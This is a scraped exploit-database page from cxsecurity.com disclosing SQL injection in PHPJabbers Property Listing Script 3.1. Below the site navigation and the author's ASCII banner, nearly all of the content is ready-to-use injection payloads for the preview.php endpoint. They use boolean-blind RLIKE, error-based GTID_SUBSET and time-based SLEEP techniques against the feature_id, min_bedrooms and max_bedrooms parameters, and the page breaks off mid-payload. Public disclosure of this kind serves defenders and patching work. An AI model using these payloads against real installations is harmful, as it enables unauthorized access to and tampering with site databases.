---
title: PHPJabbers Property Listing Script 3.1 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023010051
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-31
fetch_date: 2025-10-04T05:12:54.418002
---

# PHPJabbers Property Listing Script 3.1 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PHPJabbers Property Listing Script 3.1 SQL Injection** **2023.01.30**  Credit:  **[CraCkEr](https://cxsecurity.com/author/CraCkEr/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

┌┌───────────────────────────────────────────────────────────────────────────────────────┐
││ C r a C k E r ┌┘
┌┘ T H E C R A C K O F E T E R N A L M I G H T ││
└───────────────────────────────────────────────────────────────────────────────────────┘┘
┌──── From The Ashes and Dust Rises An Unimaginable crack.... ────┐
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ [ Vulnerability ] ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
: Author : CraCkEr :
│ Website : PHPJabbers.com │
│ Vendor : PHPJabbers │
│ Software : PHPJabbers Property Listing Script 3.1 │
│ Vuln Type: SQL Injection │
│ Impact : Database Access │
│ │
│────────────────────────────────────────────────────────────────────────────────────────│
│ ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
: :
│ Release Notes: │
│ ═════════════ │
│ │
│ SQL injection attacks can allow unauthorized access to sensitive data, modification of │
│ data and crash the application or make it unavailable, leading to lost revenue and │
│ damage to a company's reputation. │
│ │
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
Greets:
The\_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL
CryptoJob (Twitter) twitter.com/CryptozJob
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ © CraCkEr 2023 ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
Path: preview.php
/preview.php?controller=pjListings&action=pjActionProperties&listing\_search=1&for=&keyword=pent&location=&type\_id=3&specials=premium&feature\_id=[SQLI]&min\_bedrooms=[SQLI]&max\_bedrooms=[SQLI]&min\_bathrooms=[SQLI]&max\_bathrooms=[SQLI]&min\_floor\_area=11&max\_floor\_area=33
GET parameter 'feature\_id' is vulnerable to SQLI
---
Parameter: feature\_id (GET)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
Payload: controller=pjListings&action=pjActionProperties&listing\_search=1&for=&keyword=pent&location=&type\_id=3&specials=premium&feature\_id=1' RLIKE (SELECT (CASE WHEN (2062=2062) THEN 1 ELSE 0x28 END)) AND 'NbjG'='NbjG&min\_bedrooms=1&max\_bedrooms=2&min\_bathrooms=2&max\_bathrooms=3&min\_floor\_area=11&max\_floor\_area=33
Type: error-based
Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID\_SUBSET)
Payload: controller=pjListings&action=pjActionProperties&listing\_search=1&for=&keyword=pent&location=&type\_id=3&specials=premium&feature\_id=1' AND GTID\_SUBSET(CONCAT(0x717a706b71,(SELECT (ELT(2733=2733,1))),0x716b707171),2733) AND 'iWla'='iWla&min\_bedrooms=1&max\_bedrooms=2&min\_bathrooms=2&max\_bathrooms=3&min\_floor\_area=11&max\_floor\_area=33
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: controller=pjListings&action=pjActionProperties&listing\_search=1&for=&keyword=pent&location=&type\_id=3&specials=premium&feature\_id=1' AND (SELECT 3509 FROM (SELECT(SLEEP(5)))pnEw) AND 'UOAT'='UOAT&min\_bedrooms=1&max\_bedrooms=2&min\_bathrooms=2&max\_bathrooms=3&min\_floor\_area=11&max\_floor\_area=33
---
GET parameter 'min\_bedrooms' is vulnerable to SQLI
---
Parameter: min\_bedrooms (GET)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
Payload: controller=pjListings&action=pjActionProperties&listing\_search=1&for=&keyword=pent&location=&type\_id=3&specials=premium&feature\_id=1&min\_bedrooms=1) RLIKE (SELECT (CASE WHEN (7879=7879) THEN 1 ELSE 0x28 END))-- HIzI&max\_bedrooms=2&min\_bathrooms=2&max\_bathrooms=3&min\_floor\_area=11&max\_floor\_area=33
Type: error-based
Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID\_SUBSET)
Payload: controller=pjListings&action=pjActionProperties&listing\_search=1&for=&keyword=pent&location=&type\_id=3&specials=premium&feature\_id=1&min\_bedrooms=1) AND GTID\_SUBSET(CONCAT(0x717a706b71,(SELECT (ELT(2095=2095,1))),0x716b707171),2095)-- bfcY&max\_bedrooms=2&min\_bathrooms=2&max\_bathrooms=3&min\_floor\_area=11&max\_floor\_area=33
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: controller=pjListings&action=pjActionProperties&listing\_search=1&for=&keyword=pent&location=&type\_id=3&specials=premium&feature\_id=1&min\_bedrooms=1) AND (SELECT 9649 FROM (SELECT(SLEEP(5)))cOvl)-- zdSI&max\_bedrooms=2&min\_bathrooms=2&max\_bathrooms=3&min\_floor\_area=11&max\_floor\_area=33
---
GET parameter 'max\_bedrooms' is vulnerable to SQLI
---
Parameter: max\_bedrooms (GET)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
Payload: controller=pjListings&action=pjActionProperties&listing\_search=1&for=&keyword=pent&location=&type\_id=3&specials=premium&feature\_id=1&min\_bedrooms=1&max\_bedrooms=2) RLIKE (SELECT (CASE WHEN (6630=6630) THEN 2 ELSE 0x28 END))-- gEsM&min\_bathrooms=2&max\_bathrooms=3&min\_floor\_area=11&max\_floor\_area=33
Type: error-based
Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID\_SUBSET)
Payload: controller=pjListings&action=pjActionProperties&listing\_search=1&for=&keyword=pent&location=&type\_id=3&specials=premium&feature\_id=1&min\_bedrooms=1&max\_bedrooms=2) AND GTID\_SUBSET(CONCAT(0x717a706b71,(SELECT (ELT(9738=9738,1))),0x716b707171),9738)-- jXwM&min\_bathrooms=2&max\_bathrooms=3&min\_floor\_area=11&max\_floor\_area=33
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: controller=pjListings&a...